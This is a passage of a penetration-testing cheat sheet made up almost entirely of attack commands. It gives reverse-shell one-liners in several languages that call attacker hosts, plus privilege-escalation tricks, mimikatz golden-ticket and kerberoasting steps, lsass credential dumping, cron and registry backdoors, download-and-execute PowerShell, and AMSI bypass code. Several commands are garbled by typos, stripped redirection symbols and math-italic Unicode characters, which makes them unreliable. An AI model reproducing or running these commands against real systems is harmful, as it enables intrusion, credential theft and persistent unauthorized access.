python -c 'import socket, subprocess, os; s=socket. socket (socket. AF_INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```
Or


```text
check sudoer script content like:

#!/usr/bin/python3
from shutil import make_archive
src = '/var/www/html/'
# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
You have new mail in /var/mail/waldo

and create file for got root as shutil.py contains:

import os
import pty
import socket

lhost = "10.10.10.10"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
   def close(*args):
       return
   def __init__(self, *args):
       return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

and run sudoer script with 

sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```


### Bash language

```text
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

### Java language

```text
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2002;cat &5 |
while read line; do \$line 2 &5 &5; done"] as String[])
p.waitFor()
```

### Php language

```text
php -r '$sock=fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'
```

### Ruby language

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'
```

### Ruby language without /bin/sh

```text
by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, " r
") {| io|c.print io.read}end'
```

### Ruby language for windows

```text
ruby -rsocket -e
'c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen{cmd,"r" ) {|
io|c.print io.read}end'
```

### Telnet command

```text
rm -f /tmp/p; mknod /tmp/p p && telnet attackerrip 4444 0/tmp/p
--OR--
telnet attacker rip 4444 | /bin/bash | telnet attacker rip 4445
```

### Xterm command

```text
xterm -display 10.0.0.1:1
o Start Listener: Xnest: 1
o Add permission to connect: xhost +victimP
```

### Other

```text
wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
```

### spawn shell


```text
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

or

```
sudo - I
python -c 'import pty; pty. spawn("/bin/bash”)’
sudo -u webadmin vi
ESC +:+ !/bin/sh
bash - i
whoami
```

```text
try ctrl + z
stty raw -echo 
fg
```

```text
echo os.system('/bin/bash')
```

```text
/bin/sh -i
```


```text
perl —e 'exec "/bin/sh";'
```

```text
perl: exec "/bin/sh";
```

```text
ruby: exec "/bin/sh"
```

```text
lua: os.execute('/bin/sh')
```

```text
(From within IRB)
exec "/bin/sh"
```


```text
(From within vi)
:!bash
```

```text
(From within vi)
:set shell=/bin/bash:shell
```

```text
(From within nmap)
!sh
```

 [netsec.ws](http://netsec.ws/?p=337)

## Improve accessibility

Help: https://gtfobins.github.io/

### Increasing accessibility with composer

```text
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

### Increasing access with docker

You must be logged in with an application that is a member of the docker group.

```text
docker run -v /root:/mnt -it ubuntu
```

Or

```text
docker run --rm -it --privileged nginx bash
mkdir /mnt/fsroot
mount /dev/sda /mnt/fsroot
```

### Increasing access with docker socket


```text

Checking docker exposure

curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

We do the following commands in the script.

cmd="whoami"
payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds \": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)

revShellContainerID=$(echo "$response" | cut -d'"' -f4)

curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
sleep 1
curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"

Then we run it.

./docket-socket-expose.sh
```

### chroot

```
chroot /root /bin/bash
```


### Increase access with lxd

```text
in attacker host
1. git clone https://github.com/saghul/lxd-alpine-builder.git
2. ./build-alpine
in victim host
3. Download built image
4. import ./alpine-v3.12-x86_64-20200621_2005.tar.gz --alias attacker
5. lxc init attacker tester -c security.privileged=true
6. lxc exec tester/bin/sh
```



### Increase access with WSUS

```text
SharpWSUS.exe create /payload:"C:\Users\user\Desktop\PsExec64.exe" /args:"-acceptula -s -d cmd.exe /c \"net localgroup administrator user /add\"" /title: title
SharpWSUS.exe approve /updateid:<id> /computername:dc.domain.dev /groupname:"title"

```
### Increase access in journalctl

The journalctl launcher must be run with more privileges such as sudo.

```text
journalctl
!/bin/sh
```

Or

```text
sudo journalctl
!/bin/sh
```

### Improve access with Splunk Universal Forward Hijacking

```text
python PySplunkWhisperer2_remote.py --lhost 10.10.10.5 --host 10.10.15.20 --username admin --password admin --payload '/bin/bash -c "rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp /luci11|/bin/sh -i 2>&1|nc 10.10.10.5 5555 >/tmp/luci11"'

```

### Increase access with 00-header file

```text
echo "id" >> 00-header
```

### Increase accessibility in nano

```text
Ctrl+R + Ctrl+X
reset; sh 1>&0 2>&0
```

Or

```text
Ctrl+W
/etc/shadow
```

### Increase access in vi

```text
:!/bin/sh
```


### Increase access by ShadowCredentials method

```text
whisker.exe add /target:user
.\Rubeus.exe askgt /user:user /certificate:<base64-cert> /password:"password" /domain:domain /dc:DC.domain.dev /getcredentials /show
```


### Increase access using acl

```text
$user = "megacorp\jorden"
$folder = "C:\Users\administrator"
$acl = get-acl $folder
$aclpermissions = $user, "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
$aclrule = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermissions
$acl.AddAccessRule($aclrule)
set-acl -path $folder -AclObject $acl
get-acl $folder | folder
```

### Increase access with ldap

```text

To enable ssh using ldap

0. exec ldapmodify -x -w PASSWORD
1. Paste this
dn: cn=openssh-lpk,cn=schema,cn=config
objectClass: olcSchemaConfig
cn: openssh-lpk
olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME 'sshPublicKey'
   DESC 'MANDATORY: OpenSSH Public key'
   EQUALITY octetStringMatch
   SYNTAX 1.3.6.1.4.1.1466.115.121.1.40)
olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME 'ldapPublicKey' SUP top AUXILIARY
   DESC 'MANDATORY: OpenSSH LPK objectclass'
   MAY ( sshPublicKey $ uid )
   )

To improve access to the desired user and user group

2. exec ldapmodify -x -w PASSWORD
3. Paste this
dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC
changeType: modify
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: content of id_rsa.pub
-
replace: EVIL GROUP ID
uidNumber: CURRENT USER ID
-
replace: EVIL USER ID
gidNumber: CURRENT GROUP ID
```

### Copy from ndts using SeBackupPrivilege permission

```text
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

### Elevate access with the SeImpersonatePrivilege permission

```text
https://github.com/dievus/printspoofer
printspoofer.exe -i -c "powershell -c whoami"
```

### Read files without authentication with diskshadow

```text
1. priv.txt contain
SET CONTEXT PERSISTENT NEWSWRITERSp
add volume c: alias 0xprashantp
createp
expose %0xprashant% z:p
2. exec with diskshadow /s priv.txt
```

### Elevate access with the SeLoadDriverPrivilege permission

```text

FIRST:
Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
Download https://github.com/tandasat/ExploitCapcom
change ExploitCapcom.cpp line 292
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
to
TCHAR CommandLine[] = TEXT("C:\\test\\shell.exe");
then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe

SECOND:
1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
3. .\ExploitCapcom.exe
4. in msf exec `run`
```

### Escalation with find

```
var/lib/jenkins/find . -exec bash -p -i > & /dev/tcp/192.168.2.x/8000 0 > &1 \; - quit
```

### Upgrade access with vds.exe service

```text
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
```

### Improve access with ForceChangePassword


```text
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Import-Module .\PowerView_dev.ps1
Set-DomainUserPassword -Identity user1 -verbose
Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
```

### Improving access with the browser service

```text
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
```

### Improve access with GenericWrite access

```text
$pass = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\MASTER USER'), $pass)
Set-DomainObject -Credential $creds USER1 -Clear service principalname
Set-DomainObject -Credential $creds -Identity USER1 -SET @{serviceprincipalname='none/fluu'}
.\Rubeus.exe kerberoast /domain:<DOMAIN>
```

### Improve access using Sql service and ActiveSessions

```text
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
. .\Heidi.ps1
Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COMPUTERNAME
```

### Get golden ticket using mimikatz and scheduled task

```text
1.mimikatz# token::elevate
2.mimikatz# vault::cred /patch
3.mimikatz# lsadump::lsa /patch
4.mimikatz# kerberos::golden /user:Administrator /rc4:<Administrator NTLM(step 3)> /domain:<DOMAIN> /sid:<USER SID> /sids:<Administrator SIDS> /ticket:<OUTPUT TICKET PATH >
5. powercat -l -v -p 443
6.schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" /TN "enterprise" /TR "powershell.exe-c 'iex (iwr http://10.10.10.10/reverse.ps1)'"
7.schtasks /run /s DOMAIN /TN "enterprise"
```

### Upgrade access using the Pass-the-Ticket method

```text
1..\Rubeus.exe askgt /user:<USET>$ /rc4:<NTLM HASH> /ptt
2. klist
```

### Upgrade access with vulnerable GPO

```text
1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" -- GPOName "ADDITIONAL DC CONFIGURATION"
```

### Golden Ticket production with mimikatz

```text
1.mimikatz # lsadump::dcsync /user:<USER>
2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT SECURITY ID> /rce:<NTLM HASH> /id:<USER ID>
```

### Upgrade access with TRUSTWORTHY database in SQL Server


```text
1. . .\PowerUpSQL.ps1
2. Get-SQLInstanceLocal -Verbose
3. (Get-SQLServerLinkCrawl -Verbos -Instance "10.10.10.10" -Query 'select * from master..sysservers').customer.query
4. 
USE "master";
SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>"
5. powershell -ep bypass
6. Import-Module .\powercat.ps1
7. powercat -l -v -p 443 -t 10000
8.
SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>" 
execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\<DATABASE NAME>" 
```

### gdbus

```text
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
```



## Permanent access

### for Linux \(in the attacker's system\)

```text
crontab -e: set for every 10 min
0-59/10 nc ip 777 -e /bin/bash
```

### for Windows \(start task scheduler\)

```text
sc config schedule start = auto
net start schedule
at 13:30 "C:\nc.exe ip 777 -e cmd.exe""
```

### Running a backdoor along with bypassing the Windows firewall

```text
1. REG add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Run
    /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC MINUTE /t10 45 /TN FIREWALL /TR
    "%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

### Payload development in smb or webdav

```text
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload

Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set the following options:
     localexe = true
     localfile= payload
     localroot= payload directory
     disablePayloadHandler=true
3. Use psexec or wmic command to remotely execute payload
     psexec \\ remote ip /u domain\compromised_user /p password "\\payload
     ip \test\msf.exe"

OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\\ payload ip \test\msf.exe"
```

## Get lsass process and extract information with mimikatz

```text
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords f
```

## Extract information in memory using mimikatz plugin in volatility

```text
volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f halomar.dmp mimikatz
````

## Tunnel

### SSH Tunnel

```
ssh -D 8083 root@192.168.8.3
vi /etc/proxychains.conf ->  socks4 127.0.0.1 8083
proxychains nap -sT 10.1.3.1 -Pn
```

### Fpipe - receiving information from port 1234 and transferring to port 80 2.2.2.2

```text
fpipe.exe -l 1234 -r 80 2.2.2.2
```

### Socks.exe - Intranet scanning in Socks proxy

```text
On redirector (1.1.1.1):
     socks.exe -i1.1.1.1 -p 8C80

Attacker:
Modify /etc/proxjchains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 127.0.0.1 9050
Add line: socks4 1.1.1.1 8080
Scan through socks proxy:
     proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
```

### Socat - receiving information from port 1234 and transferring to port 80 2.2.2.2

```text
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
```

### Create ssh without ssh service

```text
./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.10.10.11:22
```

### Stunnel - ssl encapsulated in nc tunnel \(Windows & Linux\) \[8\]


```text
On attacker (client):
Modify /stunnel.conf
    clien = yes
    [netcat client]
    accept = 5555
    connect = -Listening IP-:4444

On victim (listening server)
Modify /stunnel.conf
    client = no
    [ne~cat server]
    accept = 4444
    connect = 7777
C:\ nc -vlp 7777

On attacker (client):
# nc -nv 127.0.0.1 5555
```

## Search tips on google

| **Parameter** | **Explanation** |
| :--- | :--- |
| site: \[url\] | Search for a site \[url\] |
| numrange: \[\#\]...\[\#\] | Search in the numerical range |
| date: \[ \#\] | Search in the last month
| link: \[url\] | Search for pages that have a specific address
| related: \[url\] | Search for pages related to a specific address
| intitle: \[string\] | Search for pages that have a specific title
| inurl: \[string\] | Search for pages that have a specific address in their url
| filejpe: \[xls\] | Search all files with xls extension
| phonebook: \[name\] | Search all phone books that have a specific name

## Video teleconferencing tips

### Polycom brand

```text
telnet ip
#Enter 1 char, get uname:pwd
http://ip/getsecure.cgi
http://ip/er_a_rc1.htm
http://ip/a_security.htm
http://ip/a_rc.htm
```

### Trandberg brand

```text
http://ip/snapctrl.ssi
```

### Sony webcam brand

```text
http:// ip /commard/visca-gen.cgi?visca=str
8101046202FF : Freeze Camera
```

## Convert binary to ski with perl

```text
cat blue | perl -lpe '$_=pack"B*",$_' > bin
```

## Review and implementation laboratory

```text
https://htbmachines.github.io/
```

## send mail

```text
swaks --to receiver@mail.dev --from from@mail.dev --server mail.server.dev --body "BODY"
```


## Sending the current file by nc

```text
nc 10.10.10.10 3131 < output.zip
```


## read auth clear-text credentials in nix

```
more /var/log/auth.log
```

## jenkins reverse shell

```
1)
nc -nvlp 999

2)
Visit http://10.1.3.1:1234/script/console
String host="192.168.2.x";
int port=999;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available
()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## check linux joined ad

```
/etc/krb5.conf
```

or

```
"kinit -k host/$(hostname -f)"
```

## linux ad credential stored

```
/var/lib/jenkins/adm_domain.keytab
```

## Request TGT using the discovered keytab file

```
kinit adm_domain@OPERATIONS.ATOMIC.SITE - k - tadmin_domain. keytab
klist
```

## Requesting CIFS ticket of Child Domain Controller

```
kuno cifs\/OPS-ChildDC
klist
```

## PTH with Linux

```
apt -get install krb5 -user
export KRB5CCNAME =/tmp/krb5cc_123
proxychains psexec.py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC
```

## Extract the hash of adm_domain user only (with active Kerberos ticket)

```
proxychains secretsdump. py -no -pass -just -dc -user adm_domain -debug -dc -ip 10.1.1.2
```


## Extract the hash OPERATIONS.ATOMIC.SITE (with active Kerberos ticket)

```
proxychains secretsdump. py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC
```

## Extract specify for domain SID

```
proxychains lookupsid.py operations/Administrator@OPS -CHILDDC -hashes aad36435b51404eeaad3b435651404ee:5984a430e639891136c949186846f24
```

or

```
$𝑈𝑠𝑒𝑟 = 𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑆𝑦𝑠𝑡𝑒𝑚. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦. 𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙. 𝑁𝑇𝐴𝑐𝑐𝑜𝑢𝑛𝑡("𝑎𝑡𝑜𝑚𝑖𝑐","𝑘𝑟𝑏𝑡𝑔𝑡")
$𝑠𝑡𝑟𝑆𝐼𝐷 = $𝑜𝑏𝑗𝑈𝑠𝑒𝑟. 𝑇𝑟𝑎𝑛𝑠𝑙𝑎𝑡𝑒([𝑆𝑦𝑠𝑡𝑒𝑚. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦. 𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙. 𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦𝐼𝑑𝑒𝑛𝑡𝑖𝑓𝑖𝑒𝑟])
$𝑠𝑡𝑟𝑆𝐼𝐷.𝑉𝑎𝑙𝑢𝑒
```


## Forge a golden ticket using OPERATIONS.ATOMIC.SITE “krbtgt” account

```
kerberos::golden /user: Administrator /domain:operations.atomic.site /sid:S-1-5-21-3757735274-1965336150-1982876978 /
krbtgt:8e268effbf6735b8fb5be206cb3dfead /sids:S-1-5-21-95921459-2896253700-3873779052-519 /ptt
```

## Schedule a task at Atomic-DC server from OPS-CHILDDC after passing golden ticket


```
1)
download & edit PowerShellTcpOneLine.ps1
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1


2)
schtasks /create /S atomic -dc.atomic.site /SC Weekly /RU "NT Authority \SYSTEM" /TN "warfare" /TR "powershell. exe - 'iea Object Net.WebClient).DownloadString("'http://192.168.2.x/Invoke -PowerShellTcpOneLine.ps1')"

3)
nc -nlvp 7779


4)
schtasks /Run /S atomic-dc. atomic. site /TN "warfare"

```

## Download & execute Invoke-Mimikatz.ps1 in memory

```
 (𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑁𝑒𝑡. 𝑊𝑒𝑏𝐶𝑙𝑖𝑒𝑛𝑡).𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑆𝑡𝑟𝑖𝑛𝑔(′ℎ𝑡𝑡𝑝://192.168.2. 𝑥/𝐼𝑛𝑣𝑜𝑘𝑒 − 𝑀𝑖𝑚𝑖𝑘𝑎𝑡𝑧. 𝑝𝑠1′);𝐼𝑛𝑣𝑜𝑘𝑒 − 𝑀𝑖𝑚𝑖𝑘𝑎𝑡𝑧 −
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 "𝑠𝑒𝑘𝑢𝑟𝑙𝑠𝑎: :𝑙𝑜𝑔𝑜𝑛𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠"
```

## Psexec in ATOMIC-DC server as enterprise administrator:

```
𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑠𝑒𝑥𝑒𝑐. 𝑝𝑦 − 𝑑𝑒𝑏𝑢𝑔 − ℎ𝑎𝑠ℎ𝑒𝑠 ∶ 𝑐49927𝑎1𝑒𝑏5𝑎335𝑑𝑓𝑏681𝑑𝑏95𝑑3𝑎45𝑎2 𝑎𝑡𝑜𝑚𝑖𝑐/𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟@𝐴𝑇𝑂𝑀𝐼𝐶 − 𝐷𝐶
```


## Enumerate named account with SPN in Nuclear.site domain

```
𝐼𝐸𝑋 (𝑁𝑒𝑤 − 𝑂𝑏𝑗𝑒𝑐𝑡 𝑁𝑒𝑡. 𝑊𝑒𝑏𝐶𝑙𝑖𝑒𝑛𝑡).𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑆𝑡𝑟𝑖𝑛𝑔(′ℎ𝑡𝑡𝑝://192.168.2.2/𝑃𝑜𝑤𝑒𝑟𝑉𝑖𝑒𝑤_𝑑𝑒𝑣. 𝑝𝑠1′)
𝐺𝑒𝑡 − 𝑁𝑒𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑇𝑟𝑢𝑠𝑡 | ? {$_. 𝑇𝑟𝑢𝑠𝑡𝑇𝑦𝑝𝑒 − 𝑛𝑒 ′𝐸𝑥𝑡𝑒𝑟𝑛𝑎𝑙′} | %{𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑈𝑠𝑒𝑟 − 𝑆𝑃𝑁 − 𝐷𝑜𝑚𝑎𝑖𝑛 $_. 𝑇𝑎𝑟𝑔𝑒𝑡𝑁𝑎𝑚𝑒}
```

## kerberoasting 

```
1)
𝐺𝑒𝑡 − 𝑁𝑒𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑇𝑟𝑢𝑠𝑡 | ? {$_. 𝑇𝑟𝑢𝑠𝑡𝑇𝑦𝑝𝑒 − 𝑛𝑒 ′𝐸𝑥𝑡𝑒𝑟𝑛𝑎𝑙′} | %{𝐺𝑒𝑡 − 𝑁𝑒𝑡𝑈𝑠𝑒𝑟 − 𝑆𝑃𝑁 − 𝐷𝑜𝑚𝑎𝑖𝑛 $_. 𝑇𝑎𝑟𝑔𝑒𝑡𝑁𝑎𝑚𝑒}

2)Enumerate accounts with SPN set in nuclear.site domain
𝑅𝑒𝑞𝑢𝑒𝑠𝑡 − 𝑆𝑃𝑁𝑇𝑖𝑐𝑘𝑒𝑡 − 𝑆𝑃𝑁 𝐻𝑇𝑇𝑃/𝑛𝑢𝑐𝑙𝑒𝑎𝑟 − 𝑑𝑐. 𝑛𝑢𝑐𝑙𝑒𝑎𝑟. 𝑠𝑖𝑡𝑒

3)
𝐼𝑛𝑣𝑜𝑘𝑒 − 𝐾𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡 − 𝐷𝑜𝑚𝑎𝑖𝑛 𝑛𝑢𝑐𝑙𝑒𝑎𝑟. 𝑠𝑖𝑡𝑒 | % { $_.𝐻𝑎𝑠ℎ } | 𝑂𝑢𝑡 − 𝐹𝑖𝑙𝑒 − 𝐸𝑛𝑐𝑜𝑑𝑖𝑛𝑔 𝐴𝑆𝐶𝐼𝐼 ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡

4)Filter the output to include only account HASH
$𝑓𝑖𝑙𝑒 = "𝐶:\𝑈𝑠𝑒𝑟𝑠\𝑃𝑢𝑏𝑙𝑖𝑐\ ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡"
$𝑏𝑎 = [𝑆𝑦𝑠𝑡𝑒𝑚. 𝑖𝑜. 𝑓𝑖𝑙𝑒]: : 𝑅𝑒𝑎𝑑𝑎𝑙𝑙𝐵𝑦𝑡𝑒𝑠($𝑓𝑖𝑙𝑒)
$𝑠𝑡𝑟 = [𝑆𝑦𝑠𝑡𝑒𝑚. 𝑐𝑜𝑛𝑣𝑒𝑟𝑡]: :𝑡𝑜𝑏𝑎𝑠𝑒64𝑠𝑡𝑟𝑖𝑛𝑔($𝑏𝑎)

5)Decode base64 & store it in file
𝑏𝑎𝑠𝑒64 "𝑒𝑛𝑐𝑜𝑑𝑒𝑑" | 𝑏𝑎𝑠𝑒64 − 𝑑 > ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡
```


## Using “sendemail” for transmitting email:

```
𝑐𝑎𝑡 𝑚𝑠𝑔.𝑡𝑥𝑡 | 𝑠𝑒𝑛𝑑𝑒𝑚𝑎𝑖𝑙 − 𝑙 𝑒𝑚𝑎𝑖𝑙. 𝑙𝑜𝑔 − 𝑓 "𝑡𝑒𝑠𝑡@𝑡𝑒𝑠𝑡. 𝑐𝑜𝑚" − 𝑢 "𝑖𝑚𝑝𝑜𝑟𝑡𝑎𝑛𝑡_𝑑𝑒𝑙𝑖𝑣𝑒𝑟𝑦" − 𝑡 "a@a.com" − 𝑠 "Title" − 𝑜 𝑡𝑙𝑠 = 𝑛𝑜 − 𝑎 1. 𝑏𝑎t
```

## Shell of DB-Server

```
𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑚𝑠𝑑𝑎𝑡. 𝑝𝑦 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 − 𝑠 10.1.3.2 − 𝑝 1433 − 𝑈 𝑠𝑎 − 𝑃 ′𝑆𝐴𝐴𝑑𝑚𝑖𝑛! @#$%′ − −𝑒𝑛𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 −
−𝑑𝑖𝑠𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 − −𝑑𝑖𝑠𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 – 𝑠ℎ𝑒𝑙l
```


## open cmd.exe with wordpress or ...

xfreerdp x.rdp /timeout:99999
Word->File->Open cmd.exe


## Abuse SMPTRAP service

```
𝑠𝑐 𝑞𝑐 𝑠𝑛𝑚𝑝𝑡𝑟𝑎p
𝑠𝑐 𝑐𝑜𝑛𝑓𝑖𝑔 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝 𝑏𝑖𝑛𝑝𝑎𝑡ℎ = "𝑛𝑒𝑡 𝑙𝑜𝑐𝑎𝑙𝑔𝑟𝑜𝑢𝑝 𝑎𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟𝑠 𝑖𝑦𝑒𝑟 /𝑎𝑑𝑑"
𝑠𝑐 𝑠𝑡𝑜𝑝 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝
𝑠𝑐 𝑠𝑡𝑎𝑟𝑡 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝
```

## amsi one line bypass 


1. Byte array: This method involves converting malicious code into a byte array, which bypasses AMSI inspection.



```
$script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABzAGUAcwB0AD0AIgBQAG8AdwBlAHIAcwBoAG8AcgBvAGYAIABjAG8AbgBzAGkAbwBuAHQAIABsAG8AbwAgACgAWwBJAF0AXQA6ADoARgBvAHIAbQBhAHQAZQByACkAIgA='))
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
for ($i = 0; $i -lt $bytes.Length; $i++) {
    if (($bytes[$i] -eq 0x41) -and ($bytes[$i+1] -eq 0x6D) -and ($bytes[$i+2] -eq 0x73) -and ($bytes[$i+3] -eq 0x69)) {
        $bytes[$i+0] = 0x42; $bytes[$i+1] = 0x6D; $bytes[$i+2] = 0x73; $bytes[$i+3] = 0x69
    }
}
[System.Reflection.Assembly]::Load($bytes)
```


2. Reflection: This method involves using .NET reflection to invoke a method that is not inspected by AMSI.


```
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)
```

or

```
